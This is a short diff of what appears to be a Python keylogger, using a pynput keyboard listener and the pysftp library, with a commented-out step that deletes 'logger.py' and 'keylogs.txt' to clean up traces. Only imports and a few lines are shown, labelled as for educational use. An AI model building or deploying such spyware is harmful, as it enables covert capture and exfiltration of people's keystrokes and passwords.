@@ -1,5 +1,8 @@
 from pynput.keyboard import Listener
-import logging, pysftp
+import logging
+import pysftp
+import time
+import os
 
 # author: ggarcz1
 # NOTE: You are free to copy, edit, and use this code for EDUCATIONAL purposes only.
@@ -45,6 +48,6 @@ with Listener(on_press=on_press) as listener:
 # # delete files after X amount of days
 # init_time = time.localtime()
 # # dynamic updates below
-# # current_time = 
+# current_time = time.localtime()
 # os.remove('logger.py')
 # os.remove('keylogs.txt')
